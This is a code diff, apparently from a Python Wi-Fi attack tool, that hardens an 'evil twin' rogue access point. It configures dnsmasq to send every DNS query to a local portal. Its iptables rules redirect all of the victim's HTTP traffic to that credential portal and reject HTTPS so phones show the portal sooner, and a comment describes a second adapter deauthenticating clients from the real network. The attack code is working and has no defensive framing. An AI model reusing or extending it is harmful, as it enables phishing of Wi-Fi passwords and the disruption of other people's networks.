@@ -189,6 +189,8 @@ def _dnsmasq_conf(path, ap_iface):
     path.write_text(
         f"interface={ap_iface}\n"
         f"bind-interfaces\n"
+        f"listen-address={AP_GATEWAY_IP}\n"
+        f"dhcp-authoritative\n"
         f"dhcp-range={AP_DHCP_START},{AP_DHCP_END},{AP_NETMASK},12h\n"
         f"dhcp-option=3,{AP_GATEWAY_IP}\n"      # шлюз
         f"dhcp-option=6,{AP_GATEWAY_IP}\n"      # DNS
@@ -197,6 +199,12 @@ def _dnsmasq_conf(path, ap_iface):
         f"log-queries\n"
     )
     return path
+
+
+def _free_port53():
+    """Гасит ТОЛЬКО наши прежние dnsmasq (с конфигом из eviltwin_*), не системные."""
+    subprocess.run(["pkill", "-f", "dnsmasq.*eviltwin"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
 def _bg(cmd, log_path):
@@ -314,25 +322,44 @@ def _start_attack(ap_interface, attack_iface, target, essid, bssid, channel,
         _run(["ip", "addr", "add", f"{AP_GATEWAY_IP}/24", "dev", ap_interface])
         _run(["ip", "link", "set", ap_interface, "up"])
 
-        # --- dnsmasq ---
+        # --- dnsmasq (DHCP + DNS, все домены -> портал) ---
+        # systemd-resolved держит только 127.0.0.53, но на всякий случай
+        # освобождаем :53 от прежних наших dnsmasq.
+        _free_port53()
         dnsmasq_conf = _dnsmasq_conf(tmp_dir / "dnsmasq.conf", ap_interface)
-        # на всякий случай гасим системный dnsmasq, чтобы не держал порт 53
-        _run(["pkill", "-f", "dnsmasq.*" + ap_interface])
         dnsmasq = _bg(["dnsmasq", "-d", "-C", str(dnsmasq_conf)],
                       tmp_dir / "dnsmasq.log")
         procs.append(("dnsmasq", dnsmasq))
-        time.sleep(1)
+        time.sleep(1.5)
+        if dnsmasq.poll() is not None:
+            print("[-] dnsmasq не запустился (вероятно, занят порт 53). Лог:")
+            print(_tail(tmp_dir / "dnsmasq.log"))
+            print("    Освободите 53: sudo systemctl stop systemd-resolved  (или dnsmasq)")
+            raise RuntimeError("dnsmasq failed")
 
-        # --- iptables: весь HTTP(S) -> портал, без доступа в интернет ---
+        # --- iptables: разрешить DNS/DHCP/HTTP на AP и завернуть весь HTTP на портал ---
+        # Политики ACCEPT важны: на не-Kali дистрибутивах INPUT по умолчанию
+        # может быть DROP, тогда DNS/HTTP до портала не доходят и плашка входа
+        # не появляется — хотя телефон подключается.
         _run(["sysctl", "-w", "net.ipv4.ip_forward=0"])
         changed_forward = True
+        _run(["iptables", "-P", "INPUT", "ACCEPT"])
+        _run(["iptables", "-P", "OUTPUT", "ACCEPT"])
+        _run(["iptables", "-P", "FORWARD", "ACCEPT"])
         _run(["iptables", "--flush"])
         _run(["iptables", "-t", "nat", "--flush"])
-        _run(["iptables", "-P", "FORWARD", "ACCEPT"])
-        for dport in ("80", "443"):
-            _run(["iptables", "-t", "nat", "-A", "PREROUTING",
-                  "-i", ap_interface, "-p", "tcp", "--dport", dport,
-                  "-j", "DNAT", "--to-destination", f"{AP_GATEWAY_IP}:{PORTAL_PORT}"])
+        # явно пропускаем DNS(53), DHCP(67) и HTTP(80) с AP-интерфейса
+        for proto, dport in (("udp", "53"), ("tcp", "53"), ("udp", "67"), ("tcp", "80")):
+            _run(["iptables", "-A", "INPUT", "-i", ap_interface,
+                  "-p", proto, "--dport", dport, "-j", "ACCEPT"])
+        # весь HTTP жертвы -> локальный портал
+        _run(["iptables", "-t", "nat", "-A", "PREROUTING",
+              "-i", ap_interface, "-p", "tcp", "--dport", "80",
+              "-j", "DNAT", "--to-destination", f"{AP_GATEWAY_IP}:{PORTAL_PORT}"])
+        # HTTPS не перехватываем (TLS не подделать) — сбрасываем, чтобы телефон
+        # быстрее перешёл на HTTP-проверку и показал портал.
+        _run(["iptables", "-A", "INPUT", "-i", ap_interface,
+              "-p", "tcp", "--dport", "443", "-j", "REJECT"])
 
         # --- Веб-портал ---
         portal_cmd = [sys.executable, "-m", "wifitool.portal_server",
@@ -344,6 +371,10 @@ def _start_attack(ap_interface, attack_iface, target, essid, bssid, channel,
         portal = subprocess.Popen(portal_cmd, cwd=str(BASE_DIR),
                                   preexec_fn=os.setsid)
         procs.append(("portal", portal))
+        time.sleep(1)
+        if portal.poll() is not None:
+            print(f"[-] Портал не запустился (возможно, порт {PORTAL_PORT} занят).")
+            raise RuntimeError("portal failed")
 
         # --- Деаутентификация ---
         # 2 адаптера: 2-й независимо глушит реальную сеть.
